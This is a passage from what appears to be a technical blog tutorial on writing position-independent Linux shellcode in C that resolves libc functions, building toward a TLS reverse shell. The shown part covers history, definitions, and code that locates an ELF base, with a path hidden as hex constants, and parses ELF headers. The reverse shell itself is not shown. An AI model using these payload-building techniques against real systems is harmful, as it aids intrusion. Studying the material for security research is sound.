
<html>
  <head>
    <meta charset="utf-8">
    <link rel="stylesheet" type="text/css" href="style.css">
    <title>Shellcode: A reverse shell in C for Linux with support for TLS/SSL</title>
  </head>
  <body>

<ol>
  <li><a href="#intro">Introduction</a></li>
  <li><a href="#history">History</a></li>
  <li><a href="#def">Definitions</a>
    <ol>
      <li><a href="#pic">Position-independent code (PIC)</a></li>
      <li><a href="#pie">Position-independent executable (PIE)</a></li>
      <li><a href="#tls">Thread Local Storage or Transport Layer Security (TLS)</a></li>
      <li><a href="#aslr">Address Space Layout Randomization (ASLR)</a></li>
      <li><a href="#elf">Executable and Link Format (ELF)</a></li>
    </ol>
  </li>
  <li><a href="#elf_base">Base of ELF</a>
    <ol>
      <li><a href="#rip">Arbitrary Code Segment Address</a></li>
      <li><a href="#elf_procfs">Process File System (procfs)</a></li>
    </ol>
  <li><a href="#elo">ELF Layout</a>
    <ol>
      <li><a href="#ehdr">File Header</a></li>
      <li><a href="#phdr">Program Header</a></li>
      <li><a href="#shdr">Section Header</a></li>
      <li><a href="#dyn">Dynamic Structure</a></li>
      <li><a href="#sym">Symbol Structure</a></li>
    </ol>
  </li>
  <li><a href="#libc_base">Base of C Library (libc)</a>
    <ol>
      <li><a href="#libc_procfs">Process File System (procfs)</a></li>
      <li><a href="#dt_pltgot">Global Offset Table (DT_PLTGOT)</a></li>
      <li><a href="#dt_debug">Debug Structure (DT_DEBUG)</a></li>
      <li><a href="#tcb">Thread Control Block (TCB)</a></li>
    </ol>
  </li>
  <li><a href="#dlsym">Resolving Address of Functions</a>
    <ol>
      <li><a href="#dt_hash">ELF Hash Table (DT_HASH)</a></li>
      <li><a href="#dt_gnu_hash">GNU Hash Table (DT_GNU_HASH)</a></li>
      <li><a href="#dt_dynsym">Dynamic Symbol Table (DT_SYMTAB, DT_DYNSYM)</a></li>
      <li><a href="#dt_maru_hash">Using Hash Algorithm (SHT_SYMTAB, SHT_DYNSYM)</a></li>
    </ol>
  <li><a href="#dlopen">Loading Shared Objects</a>
    <ol>
      <li><a href="#libc_load">__libc_dlopen_mode and __libc_dlsym</a></li>
      <li><a href="#load_ld_config">Using /etc/ld.so.conf.d/</a></li>
    </ol>
  </li>
  <li><a href="#shell">Reverse Shell using SSL/TLS</a>
    <ol>
      <li><a href="#dsdata">Data Table</a></li>
      <li><a href="#strings">Strings</a></li>
      <li><a href="#compile">Compiling</a></li>
      <li><a href="#testing">Testing</a></li>
    </ol>
  </li>
  <li><a href="#summary">Summary</a>
</ol>

<h3 id="intro">1. Introduction</h3>

<p>This post will describe how to implement a position-independent code for Linux that can resolve the address of functions in the GNU C Library. The GNU Compiler Collection on an AMD64 build of Debian Linux will be used to compile a source code in C and extract the shellcode from binary. Once you're familiar with the entire process, writing shellcode for other architectures should be easier. There are many tutorials about writing shellcode for Linux using system calls, but very few, if any at all, using the GNU C Library. The lack of tutorials can be attributed to the fact that process management, file system operations and network connectivity, can be easily implemented on Linux using system calls. In contrast with Linux, the Windows kernel is based on subsystems where the invocation of system calls is not a simple straight forward process. Due to the complexity of system calls on windows, it's necessary to resolve the address of wrapper functions in Dynamic-link Libraries to do anything useful. This is why tutorials about writing shellcode in C for Windows well outnumber those for Linux. </p>

<p>For reading material, I would recommend the book <a href="https://www.packtpub.com/networking-and-servers/learning-linux-binary-analysis">Linux Binary Analysis</a> by <a href="http://www.bitlackeys.org/">Ryan "elfmaster" O'Neill.</a> There's a lot of free reading material online that you can find with any good search engine. If you just want a PoC source code, <a href="https://github.com/odzhan/shellcode/tree/master/os/linux/c">see here.</a> The following screenshot shows the shellcode connected to TCP/IP tool ncat.</p>

<img src="https://modexp.files.wordpress.com/2019/04/ncat.png"><br>

<h3 id="history">2. History</h3>

<p>The following table ordered in chronological order, highlights some examples of those using C to implement shellcode. There are probably many more than what I've listed. Feel free to email me the details of anyone else and I'll update accordingly.</p>

<table border="1">
  <tr>
    <td>August 1999</td>
    <td>Sebastian "stealth" Krahmer from Team TESO publishes <a href="https://packetstormsecurity.com/files/10517/hellkit-1.1.tar.gz.html">Hellkit 1.1</a>, a tool that converts C code into shellcode for Linux. TESO is an acronym for the original founders of the group (Typo, Edi, Stanly, Oxigen) :)</td>
  </tr>
  <tr>
    <td>July 2003</td>
    <td>Inspired by Hellkit, the author of <a href="https://scapy.net/">scapy</a>, <a href="http://www.secdev.org/">Philippe Biondi</a> publishes shellforge that uses a combination of C header files and Python to convert a C source code into a shellcode for Linux.</td>
  </tr>
  <tr>
    <td>September 2003</td>
    <td>Dave Aitel from ImmunitySec publishes <a href="https://packetstormsecurity.com/files/31755/MOSDEF0.1.tgz.html">MOSDEF</a>, a C-like compiler that generates shellcode for Windows and Linux.</td>
  </tr>
  <tr>
    <td>September 2006</td>
    <td>Benjamin Caillat publishes <a href="http://benjamin.caillat.free.fr/wishmaster.php">WiShMaster</a>, a tool that generates shellcode for Windows from a C source code.</td>
  </tr>
  <tr>
    <td>May 2010</td>
    <td>Didier Stevens publishes <a href="https://blog.didierstevens.com/2010/05/04/writing-win32-shellcode-with-a-c-compiler/">article</a> on writing shellcode for Windows using C.</td>
  </tr>
  <tr>
    <td>July 2010</td>
    <td>Nick Harbour publishes <a href="https://nickharbour.wordpress.com/2010/07/01/writing-shellcode-with-a-c-compiler/">article</a> on writing shellcode for Windows using C.</td>
  </tr>
  <tr>
    <td>November 2011</td>
    <td><a href="http://radare.today/posts/payloads-in-c/">Radare</a> publish ragg-cc, a shellcode compiler based on gcc and sflib (shellforge).</td>
  </tr>
  <tr>
    <td>August 2013</td>
    <td>Matt Graeber publishes <a href="http://www.exploit-monday.com/2013/08/writing-optimized-windows-shellcode-in-c.html">article</a> on writing shellcode for Windows using C.</td>
  </tr>
  <tr>
    <td>November 2013</td>
    <td><a href="https://github.com/whatsbcn/shellforge4">Shellforge G4</a> published. It's a fork of shellforge now maintained by Albert Sellarès.</td>
  </tr>
  <tr>
    <td>May 2014</td>
    <td><a href="https://twitter.com/humeafo">humeafo</a> publishes a shellcode <a href="https://github.com/humeafo/scc">compiler</a> for windows that uses llvm/clang.</td>
  </tr>
  <tr>
    <td>December 2015</td>
    <td>Binary Ninja publish a <a href="https://scc.binary.ninja/index.html">shellcode compiler</a> for Windows and Linux. Target architectures include x86, x64, arm, armeb, aarch64, mips, mipsel, ppc, ppcel.</td>
  </tr>
  <tr>
    <td>May 2016</td>
    <td>Jack Ullrich publishes <a href="https://web.archive.org/web/20170501023430/http://winternl.com/2016/05/02/hello-world/">article</a> on writing shellcode for Windows using C.</td>
  </tr>
  <tr>
    <td>May 2016</td>
    <td>Phrack publish <a href="http://www.phrack.org/issues/69/4.html">issue #69</a> with article by <a href="https://twitter.com/fishstiqz">Justin "fishstiqz" Fisher</a> that describes using gcc-mingw to generate windows shellcode in C.</td>
  </tr>
  <tr>
    <td>June 2016</td>
    <td>Guillaume Delugré publishes <a href="https://github.com/gdelugre/shell-factory">Shell-Factory</a>, a tool that uses C++ to generate shellcode for Linux.</td>
  </tr>
  <tr>
    <td>August 2016</td>
    <td>Ixty publishes <a href="https://github.com/ixty/xarch_shellcode">shellcode generator</a> that derives a cross-platform shellcode for Linux targetting x86, amd64, aarch32 and aarch64.</td>
  </tr>
  <tr>
    <td>November 2016</td>
    <td>Ionut Popescu publishes a <a href="https://github.com/NytroRST/ShellcodeCompiler">shellcode compiler</a> for Windows.</td>
  </tr>
  <tr>
    <td>Jan 2018</td>
    <td>SheLLVM publishes a <a href="https://github.com/SheLLVM/SheLLVM">shellcode compiler</a> for Windows.</td>
  </tr>
</table>

<h3 id="def">3. Definitions</h3>

<p>I was unsure about including these descriptions because I assume most of you are familiar with them. They are provided here for those that aren't.</p>

<h3 id="pic">3.1 Position-independent code (PIC)</h3>

<p>When a PIC is executed, it should successfully run regardless of where it resides in memory. This is compulsory for any shellcode, and unless a target binary is statically linked, dependencies should always be resolved dynamically.</p>

<h3 id="pie">3.2 Position-independent executables (PIE)</h3>

<p>Executable binaries made entirely from PIC are mandatory by some systems lacking a Memory Management Unit. However, it's also used by Address Space Layout Randomization to increase the difficulty of exploiting vulnerabilities. The version of Debian I'm working with has a build of GCC that enables PIE generated binaries by default.</p>

<h3 id="tls">3.3 Thread Local Storage / Transport Layer Security (TLS)</h3>

<p>TLS is synonymous with the protocol that protects the vast majority of online communications, but it can also refer to a local area of memory containing global variables that are only accessible to a single thread.</p>

<h3 id="aslr">3.4 Address Space Layout Randomization (ASLR)</h3>

<p>ASLR is a technique invented by <a href="http://pax.grsecurity.net/">The PaX Team</a> and published in July 2001. It is intended to mitigate against the exploitation of vulnerabilities by randomizing the memory addresses of a process, including the base of the executable, the stack, the heap and libraries. ASLR is not used for statically linked binaries.</p>

<h3 id="elf">3.5 Executable and Link Format</h3>

<p>The original <a href="http://refspecs.linuxbase.org/elf/elf.pdf">specification</a> for the Executable and Link Format (ELF) was published in May 1995 by the <a href="https://refspecs.linuxfoundation.org/">Linux Foundation</a>. Before attempting to locate the base address of the GNU C Library and any of its exported functions, it's important to familiarize yourself with the structure of an ELF binary.</p>

<h3 id="elf_base">4. Base of ELF</h3>

<p>We can't do very much without the base address of the host process or some shared object already loaded into memory, and trying to discover a valid base address through brute force will take forever if ASLR is enabled. Based on my own meagre knowledge of linux internals, I can currently only think of two ways to do this...or one depending on where shellcode is running. If the shellcode is running from an executable segment belonging to the host process, we simply read the value of the instruction pointer/program counter. If the shellcode is running from executable memory allocated by the <code>mmap</code> function, we can try reading the address from <code>/proc/self/maps</code> or somehow obtain an arbitrary address from the stack or heap.</p>

<h3 id="rip">4.1 Arbitrary Code Address</h3>

<p>The <code>get_rip()</code> function with AMD64 assembly inlined simply loads the current value of the Instruction Pointer (IP) into the RAX register before returning. The <code>get_base</code> function will then compare the first 32-bits or 4-bytes of address with what is normally found at the start of an ELF binary. (0x7f 0x45 0x4c 0x46) The function continues by subtracting one page or 4096 bytes until it either finds address or crashes. Of course, it might be wise to have a limit on this to avoid a segfault.</p>
  
<pre style='color:#000000;background:#ffffff;'><span style='color:#800000; font-weight:bold; '>void</span><span style='color:#808030; '>*</span> get_rip<span style='color:#808030; '>(</span><span style='color:#800000; font-weight:bold; '>void</span><span style='color:#808030; '>)</span> <span style='color:#800080; '>{</span>
    <span style='color:#800000; font-weight:bold; '>void</span><span style='color:#808030; '>*</span> ret<span style='color:#800080; '>;</span>

    __asm__ __volatile__ <span style='color:#808030; '>(</span>
      <span style='color:#800000; '>"</span><span style='color:#0000e6; '>lea (</span><span style='color:#007997; '>%%</span><span style='color:#0000e6; '>rip), </span><span style='color:#007997; '>%%</span><span style='color:#0000e6; '>rax</span><span style='color:#0f69ff; '>\n</span><span style='color:#800000; '>"</span>
      <span style='color:#800000; '>"</span><span style='color:#0000e6; '>.globl get_rip_label	</span><span style='color:#0f69ff; '>\n</span><span style='color:#800000; '>"</span>
      <span style='color:#800000; '>"</span><span style='color:#0000e6; '>get_rip_label:		    </span><span style='color:#0f69ff; '>\n</span><span style='color:#800000; '>"</span>
      <span style='color:#800000; '>"</span><span style='color:#0000e6; '>mov </span><span style='color:#007997; '>%%</span><span style='color:#0000e6; '>rax, %0</span><span style='color:#800000; '>"</span> <span style='color:#800080; '>:</span> <span style='color:#800000; '>"</span><span style='color:#0000e6; '>=r</span><span style='color:#800000; '>"</span><span style='color:#808030; '>(</span>ret<span style='color:#808030; '>)</span><span style='color:#808030; '>)</span><span style='color:#800080; '>;</span>

    <span style='color:#800000; font-weight:bold; '>return</span> ret<span style='color:#800080; '>;</span>
<span style='color:#800080; '>}</span>

<span style='color:#800000; font-weight:bold; '>void</span> <span style='color:#808030; '>*</span>get_base<span style='color:#808030; '>(</span><span style='color:#800000; font-weight:bold; '>void</span><span style='color:#808030; '>*</span> addr<span style='color:#808030; '>)</span> <span style='color:#800080; '>{</span>
    uint64_t base <span style='color:#808030; '>=</span> <span style='color:#808030; '>(</span>uint64_t<span style='color:#808030; '>)</span>addr<span style='color:#800080; '>;</span>
    
    <span style='color:#696969; '>// align down</span>
    base <span style='color:#808030; '>&amp;</span><span style='color:#808030; '>=</span> <span style='color:#808030; '>-</span><span style='color:#008c00; '>4096</span><span style='color:#800080; '>;</span>
    
    <span style='color:#696969; '>// equal to ELF?</span>
    <span style='color:#800000; font-weight:bold; '>while</span> <span style='color:#808030; '>(</span><span style='color:#808030; '>*</span><span style='color:#808030; '>(</span>uint32_t<span style='color:#808030; '>*</span><span style='color:#808030; '>)</span>base <span style='color:#808030; '>!</span><span style='color:#808030; '>=</span> <span style='color:#008000; '>0x464c457f</span><span style='color:#006600; '>UL</span><span style='color:#808030; '>)</span> <span style='color:#800080; '>{</span>
      base <span style='color:#808030; '>-</span><span style='color:#808030; '>=</span> <span style='color:#008c00; '>4096</span><span style='color:#800080; '>;</span>
    <span style='color:#800080; '>}</span>
    <span style='color:#800000; font-weight:bold; '>return</span> <span style='color:#808030; '>(</span><span style='color:#800000; font-weight:bold; '>void</span><span style='color:#808030; '>*</span><span style='color:#808030; '>)</span>base<span style='color:#800080; '>;</span>
<span style='color:#800080; '>}</span>
</pre>

<h3 id="elf_procfs">4.2 Process File System</h3>
  
<p><code>/proc/self/maps</code> contains a list of memory addresses, the permissions and the path of module mapped into that memory space. The first address found should belong to the host process. The following code will read the first address, convert to binary and return. Note that some of the system calls are preceded with an underscore. That's because they are implemented using inline assembly in the sources.</p>

<pre style='color:#000000;background:#ffffff;'>uint64_t hex2bin<span style='color:#808030; '>(</span><span style='color:#800000; font-weight:bold; '>const</span> <span style='color:#800000; font-weight:bold; '>char</span> hex<span style='color:#808030; '>[</span><span style='color:#808030; '>]</span><span style='color:#808030; '>)</span> <span style='color:#800080; '>{</span>
    uint64_t r<span style='color:#808030; '>=</span><span style='color:#008c00; '>0</span><span style='color:#800080; '>;</span>
    <span style='color:#800000; font-weight:bold; '>char</span>     c<span style='color:#800080; '>;</span>
    <span style='color:#800000; font-weight:bold; '>int</span>      i<span style='color:#800080; '>;</span>
    
    <span style='color:#800000; font-weight:bold; '>for</span><span style='color:#808030; '>(</span>i<span style='color:#808030; '>=</span><span style='color:#008c00; '>0</span><span style='color:#800080; '>;</span> i<span style='color:#808030; '>&lt;</span><span style='color:#008c00; '>16</span><span style='color:#800080; '>;</span> i<span style='color:#808030; '>+</span><span style='color:#808030; '>+</span><span style='color:#808030; '>)</span> <span style='color:#800080; '>{</span>
      c <span style='color:#808030; '>=</span> hex<span style='color:#808030; '>[</span>i<span style='color:#808030; '>]</span><span style='color:#800080; '>;</span>
      <span style='color:#800000; font-weight:bold; '>if</span><span style='color:#808030; '>(</span>c <span style='color:#808030; '>></span><span style='color:#808030; '>=</span> <span style='color:#0000e6; '>'0'</span> <span style='color:#808030; '>&amp;</span><span style='color:#808030; '>&amp;</span> c <span style='color:#808030; '>&lt;</span><span style='color:#808030; '>=</span> <span style='color:#0000e6; '>'9'</span><span style='color:#808030; '>)</span> <span style='color:#800080; '>{</span> 
        c <span style='color:#808030; '>=</span> c <span style='color:#808030; '>-</span> <span style='color:#0000e6; '>'0'</span><span style='color:#800080; '>;</span>
      <span style='color:#800080; '>}</span> <span style='color:#800000; font-weight:bold; '>else</span> <span style='color:#800000; font-weight:bold; '>if</span><span style='color:#808030; '>(</span>c <span style='color:#808030; '>></span><span style='color:#808030; '>=</span> <span style='color:#0000e6; '>'a'</span> <span style='color:#808030; '>&amp;</span><span style='color:#808030; '>&amp;</span> c <span style='color:#808030; '>&lt;</span><span style='color:#808030; '>=</span> <span style='color:#0000e6; '>'f'</span><span style='color:#808030; '>)</span> <span style='color:#800080; '>{</span>
        c <span style='color:#808030; '>=</span> c <span style='color:#808030; '>-</span> <span style='color:#0000e6; '>'a'</span> <span style='color:#808030; '>+</span> <span style='color:#008c00; '>10</span><span style='color:#800080; '>;</span>
      <span style='color:#800080; '>}</span> <span style='color:#800000; font-weight:bold; '>else</span> <span style='color:#800000; font-weight:bold; '>if</span><span style='color:#808030; '>(</span>c <span style='color:#808030; '>></span><span style='color:#808030; '>=</span> <span style='color:#0000e6; '>'A'</span> <span style='color:#808030; '>&amp;</span><span style='color:#808030; '>&amp;</span> c <span style='color:#808030; '>&lt;</span><span style='color:#808030; '>=</span> <span style='color:#0000e6; '>'F'</span><span style='color:#808030; '>)</span> <span style='color:#800080; '>{</span>
        c <span style='color:#808030; '>=</span> c <span style='color:#808030; '>-</span> <span style='color:#0000e6; '>'A'</span> <span style='color:#808030; '>+</span> <span style='color:#008c00; '>10</span><span style='color:#800080; '>;</span>
      <span style='color:#800080; '>}</span> <span style='color:#800000; font-weight:bold; '>else</span> <span style='color:#800000; font-weight:bold; '>break</span><span style='color:#800080; '>;</span>
      r <span style='color:#808030; '>*</span><span style='color:#808030; '>=</span> <span style='color:#008c00; '>16</span><span style='color:#800080; '>;</span>
      r <span style='color:#808030; '>+</span><span style='color:#808030; '>=</span> c<span style='color:#800080; '>;</span>
    <span style='color:#800080; '>}</span>
    <span style='color:#800000; font-weight:bold; '>return</span> r<span style='color:#800080; '>;</span>
<span style='color:#800080; '>}</span>

<span style='color:#800000; font-weight:bold; '>void</span> <span style='color:#808030; '>*</span>get_base<span style='color:#808030; '>(</span><span style='color:#800000; font-weight:bold; '>void</span><span style='color:#808030; '>)</span> <span style='color:#800080; '>{</span>
    <span style='color:#800000; font-weight:bold; '>int</span>  maps<span style='color:#800080; '>;</span>
    <span style='color:#800000; font-weight:bold; '>void</span> <span style='color:#808030; '>*</span>addr<span style='color:#800080; '>;</span>
    <span style='color:#800000; font-weight:bold; '>char</span> line<span style='color:#808030; '>[</span><span style='color:#008c00; '>32</span><span style='color:#808030; '>]</span><span style='color:#800080; '>;</span>
    <span style='color:#800000; font-weight:bold; '>int</span>  str<span style='color:#808030; '>[</span><span style='color:#008c00; '>8</span><span style='color:#808030; '>]</span><span style='color:#800080; '>;</span>
    
    <span style='color:#696969; '>// /proc/self/maps</span>
    str<span style='color:#808030; '>[</span><span style='color:#008c00; '>0</span><span style='color:#808030; '>]</span> <span style='color:#808030; '>=</span> <span style='color:#008000; '>0x6f72702f</span><span style='color:#800080; '>;</span>
    str<span style='color:#808030; '>[</span><span style='color:#008c00; '>1</span><span style='color:#808030; '>]</span> <span style='color:#808030; '>=</span> <span style='color:#008000; '>0x65732f63</span><span style='color:#800080; '>;</span>
    str<span style='color:#808030; '>[</span><span style='color:#008c00; '>2</span><span style='color:#808030; '>]</span> <span style='color:#808030; '>=</span> <span style='color:#008000; '>0x6d2f666c</span><span style='color:#800080; '>;</span>
    str<span style='color:#808030; '>[</span><span style='color:#008c00; '>3</span><span style='color:#808030; '>]</span> <span style='color:#808030; '>=</span> <span style='color:#008000; '>0x00737061</span><span style='color:#800080; '>;</span>
    str<span style='color:#808030; '>[</span><span style='color:#008c00; '>4</span><span style='color:#808030; '>]</span> <span style='color:#808030; '>=</span> <span style='color:#008c00; '>0</span><span style='color:#800080; '>;</span>
    
    maps <span style='color:#808030; '>=</span> _open<span style='color:#808030; '>(</span><span style='color:#808030; '>(</span><span style='color:#800000; font-weight:bold; '>char</span><span style='color:#808030; '>*</span><span style='color:#808030; '>)</span>str<span style='color:#808030; '>,</span> O_RDONLY<span style='color:#808030; '>,</span> <span style='color:#008c00; '>0</span><span style='color:#808030; '>)</span><span style='color:#800080; '>;</span>
    <span style='color:#800000; font-weight:bold; '>if</span><span style='color:#808030; '>(</span><span style='color:#808030; '>!</span>maps<span style='color:#808030; '>)</span> <span style='color:#800000; font-weight:bold; '>return</span> <span style='color:#7d0045; '>NULL</span><span style='color:#800080; '>;</span>
    
    _read<span style='color:#808030; '>(</span>maps<span style='color:#808030; '>,</span> line<span style='color:#808030; '>,</span> <span style='color:#008c00; '>16</span><span style='color:#808030; '>)</span><span style='color:#800080; '>;</span>
    _close<span style='color:#808030; '>(</span>maps<span style='color:#808030; '>)</span><span style='color:#800080; '>;</span>
    
    addr <span style='color:#808030; '>=</span> <span style='color:#808030; '>(</span><span style='color:#800000; font-weight:bold; '>void</span><span style='color:#808030; '>*</span><span style='color:#808030; '>)</span>hex2bin<span style='color:#808030; '>(</span>line<span style='color:#808030; '>)</span><span style='color:#800080; '>;</span>
    <span style='color:#800000; font-weight:bold; '>return</span> addr<span style='color:#800080; '>;</span>
<span style='color:#800080; '>}</span>
</pre>

<p>However, if the system has patches by Grsecurity installed and <code>GRKERNSEC_PROC_MEMMAP</code> is enabled, this code will not work.</p>

<h3 id="elo">5. ELF Layout</h3>

<p>Parsing ELF files in memory is required if you want to find the address of functions. I will only discuss what's necessary to locate the symbol, string and hash tables.</p>

<h3 id="ehdr">5.1 File Header</h3>

<p>The most important header of all. Every valid ELF executable and shared object should begin with this file header. The binary is interpreted using the following structure.</p>

<pre style='color:#000000;background:#ffffff;'><span style='color:#800000; font-weight:bold; '>typedef</span> <span style='color:#800000; font-weight:bold; '>struct</span> <span style='color:#800080; '>{</span>
  <span style='color:#800000; font-weight:bold; '>unsigned</span> <span style='color:#800000; font-weight:bold; '>char</span> e_ident<span style='color:#808030; '>[</span>EI_NIDENT<span style='color:#808030; '>]</span><span style='color:#800080; '>;</span> <span style='color:#696969; '>/* File identification.              */</span>
  Elf64_Half  e_type<span style='color:#800080; '>;</span>               <span style='color:#696969; '>/* File type.                        */</span>
  Elf64_Half  e_machine<span style='color:#800080; '>;</span>            <span style='color:#696969; '>/* Machine architecture.             */</span>
  Elf64_Word  e_version<span style='color:#800080; '>;</span>            <span style='color:#696969; '>/* ELF format version.               */</span>
  Elf64_Addr  e_entry<span style='color:#800080; '>;</span>              <span style='color:#696969; '>/* Entry point.                      */</span>
  Elf64_Off   e_phoff<span style='color:#800080; '>;</span>              <span style='color:#696969; '>/* Program header file offset.       */</span>
  Elf64_Off   e_shoff<span style='color:#800080; '>;</span>              <span style='color:#696969; '>/* Section header file offset.       */</span>
  Elf64_Word  e_flags<span style='color:#800080; '>;</span>              <span style='color:#696969; '>/* Architecture-specific flags.      */</span>
  Elf64_Half  e_ehsize<span style='color:#800080; '>;</span>             <span style='color:#696969; '>/* Size of ELF header in bytes.      */</span>
  Elf64_Half  e_phentsize<span style='color:#800080; '>;</span>          <span style='color:#696969; '>/* Size of program header entry.     */</span>
  Elf64_Half  e_phnum<span style='color:#800080; '>;</span>              <span style='color:#696969; '>/* Number of program header entries. */</span>
  Elf64_Half  e_shentsize<span style='color:#800080; '>;</span>          <span style='color:#696969; '>/* Size of section header entry.     */</span>
  Elf64_Half  e_shnum<span style='color:#800080; '>;</span>              <span style='color:#696969; '>/* Number of section header entries. */</span>
  Elf64_Half  e_shstrndx<span style='color:#800080; '>;</span>           <span style='color:#696969; '>/* Section name strings section.     */</span>
<span style='color:#800080; '>}</span> Elf64_Ehdr<span style='color:#800080; '>;</span>
</pre>

<p>The only fields we need to concern ourselves with for the shellcode are <code>e_ident</code>, <code>e_phoff</code>, <code>e_phnum</code>, <code>e_shoff</code> and <code>e_shnum</code>. The following shows the header for <code>/bin/ls</code> using: <strong>readelf -h /bin/ls</strong></p>

<pre>
  ELF Header:
  Magic:   7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00 
  Class:                             ELF64
  Data:                              2's complement, little endian
  Version:                           1 (current)
  OS/ABI:                            UNIX - System V
  ABI Version:                       0
  Type:                              DYN (Shared object file)
  Machine:                           Advanced Micro Devices X86-64
  Version:                           0x1
  Entry point address:               0x5430
  Start of program headers:          64 (bytes into file)
  Start of section headers:          128816 (bytes into file)
  Flags:                             0x0
  Size of this header:               64 (bytes)
  Size of program headers:           56 (bytes)
  Number of program headers:         9
  Size of section headers:           64 (bytes)
  Number of section headers:         30
  Section header string table index: 29
</pre>

<h3 id="phdr">5.2. Program Header</h3>

<p>To resolve the address of functions, we only need to work with <code>PT_DYNAMIC</code> and <code>PT_LOAD</code> types. <code>PT_LOAD</code> indicates a loadable program segment such as code (<code>.text</code>) or data (<code>.data</code>). An ELF binary should always have at least one <code>PT_LOAD</code> header, but if <code>PT_DYNAMIC</code> is missing, this indicates the binary has been linked statically and requires resolving functions via the section headers read from disk. Of course, you can always use hardcoded addresses.</p>

<pre style='color:#000000;background:#ffffff;'><span style='color:#800000; font-weight:bold; '>typedef</span> <span style='color:#800000; font-weight:bold; '>struct</span> <span style='color:#800080; '>{</span>
  Elf64_Word  p_type<span style='color:#800080; '>;</span>               <span style='color:#696969; '>/* Entry type.                       */</span>
  Elf64_Word  p_flags<span style='color:#800080; '>;</span>              <span style='color:#696969; '>/* Access permission flags.          */</span>
  Elf64_Off   p_offset<span style='color:#800080; '>;</span>             <span style='color:#696969; '>/* File offset of contents.          */</span>
  Elf64_Addr  p_vaddr<span style='color:#800080; '>;</span>              <span style='color:#696969; '>/* Virtual address in memory image.  */</span>
  Elf64_Addr  p_paddr<span style='color:#800080; '>;</span>              <span style='color:#696969; '>/* Physical address (not used).      */</span>
  Elf64_Xword p_filesz<span style='color:#800080; '>;</span>             <span style='color:#696969; '>/* Size of contents in file.         */</span>
  Elf64_Xword p_memsz<span style='color:#800080; '>;</span>              <span style='color:#696969; '>/* Size of contents in memory.       */</span>
  Elf64_Xword p_align<span style='color:#800080; '>;</span>              <span style='color:#696969; '>/* Alignment in memory and file.     */</span>
<span style='color:#800080; '>}</span> Elf64_Phdr<span style='color:#800080; '>;</span>
</pre>

<p>Example of dumping program headers for <code>/bin/ls</code> using: <strong>readelf -l /bin/ls</strong></p>

<pre>
Program Headers:
  Type           Offset             VirtAddr           PhysAddr
                 FileSiz            MemSiz              Flags  Align
  PHDR           0x0000000000000040 0x0000000000000040 0x0000000000000040
                 0x00000000000001f8 0x00000000000001f8  R E    0x8
  INTERP         0x0000000000000238 0x0000000000000238 0x0000000000000238
                 0x000000000000001c 0x000000000000001c  R      0x1
      [Requesting program interpreter: /lib64/ld-linux-x86-64.so.2]
  LOAD           0x0000000000000000 0x0000000000000000 0x0000000000000000
                 0x000000000001e184 0x000000000001e184  R E    0x200000
  LOAD           0x000000000001e388 0x000000000021e388 0x000000000021e388
                 0x0000000000001260 0x0000000000002440  RW     0x200000
  DYNAMIC        0x000000000001edb8 0x000000000021edb8 0x000000000021edb8
                 0x00000000000001f0 0x00000000000001f0  RW     0x8
  NOTE           0x0000000000000254 0x0000000000000254 0x0000000000000254
                 0x0000000000000044 0x0000000000000044  R      0x4
  GNU_EH_FRAME   0x000000000001ab74 0x000000000001ab74 0x000000000001ab74
                 0x000000000000082c 0x000000000000082c  R      0x4
  GNU_STACK      0x0000000000000000 0x0000000000000000 0x0000000000000000
                 0x0000000000000000 0x0000000000000000  RW     0x10
  GNU_RELRO      0x000000000001e388 0x000000000021e388 0x000000000021e388
                 0x0000000000000c78 0x0000000000000c78  R      0x1
</pre>

<p>The LOAD header with <code>Offset FileSiz</code> 0x1e184 is the <code>.text</code> segment. We know this because the flags have Read(R) and Execute(E). The other LOAD header has Read(R) and Write(W) flags, and indicates the <code>.data</code> segment. The only time you will see all three together (RWE) is in the OMAGIC format or a potentially malicious binary, of course. The following code when provided the <var>base</var> address of an ELF will return the first program header of <var>type</var>, or zero if one can't be found.</p>

<pre style='color:#000000;background:#ffffff;'><span style='color:#696969; '>// return pointer to program header</span>
Elf64_Phdr <span style='color:#808030; '>*</span>elf_get_phdr<span style='color:#808030; '>(</span><span style='color:#800000; font-weight:bold; '>void</span> <span style='color:#808030; '>*</span>base<span style='color:#808030; '>,</span> <span style='color:#800000; font-weight:bold; '>int</span> type<span style='color:#808030; '>)</span> <span style='color:#800080; '>{</span>
    <span style='color:#800000; font-weight:bold; '>int</span>        i<span style='color:#800080; '>;</span>
    Elf64_Ehdr <span style='color:#808030; '>*</span>ehdr<span style='color:#800080; '>;</span>
    Elf64_Phdr <span style='color:#808030; '>*</span>phdr<span style='color:#800080; '>;</span>
    
    <span style='color:#696969; '>// sanity check on base and type</span>
    <span style='color:#800000; font-weight:bold; '>if</span><span style='color:#808030; '>(</span>base <span style='color:#808030; '>=</span><span style='color:#808030; '>=</span> <span style='color:#7d0045; '>NULL</span> <span style='color:#808030; '>|</span><span style='color:#808030; '>|</span> type <span style='color:#808030; '>=</span><span style='color:#808030; '>=</span> PT_NULL<span style='color:#808030; '>)</span> <span style='color:#800000; font-weight:bold; '>return</span> <span style='color:#7d0045; '>NULL</span><span style='color:#800080; '>;</span>
    
    <span style='color:#696969; '>// ensure this some semblance of ELF header</span>
    <span style='color:#800000; font-weight:bold; '>if</span><span style='color:#808030; '>(</span><span style='color:#808030; '>*</span><span style='color:#808030; '>(</span>uint32_t<span style='color:#808030; '>*</span><span style='color:#808030; '>)</span>base <span style='color:#808030; '>!</span><span style='color:#808030; '>=</span> <span style='color:#008000; '>0x464c457f</span><span style='color:#006600; '>UL</span><span style='color:#808030; '>)</span> <span style='color:#800000; font-weight:bold; '>return</span> <span style='color:#7d0045; '>NULL</span><span style='color:#800080; '>;</span>
    
    <span style='color:#696969; '>// ok get offset to the program headers</span>
    ehdr<span style='color:#808030; '>=</span><span style='color:#808030; '>(</span>Elf64_Ehdr<span style='color:#808030; '>*</span><span style='color:#808030; '>)</span>base<span style='color:#800080; '>;</span>
    phdr<span style='color:#808030; '>=</span><span style='color:#808030; '>(</span>Elf64_Phdr<span style='color:#808030; '>*</span><span style='color:#808030; '>)</span><span style='color:#808030; '>(</span>base <span style='color:#808030; '>+</span> ehdr<span style='color:#808030; '>-</span><span style='color:#808030; '>></span>e_phoff<span style='color:#808030; '>)</span><span style='color:#800080; '>;</span>
    
    <span style='color:#696969; '>// search through list to find requested type</span>
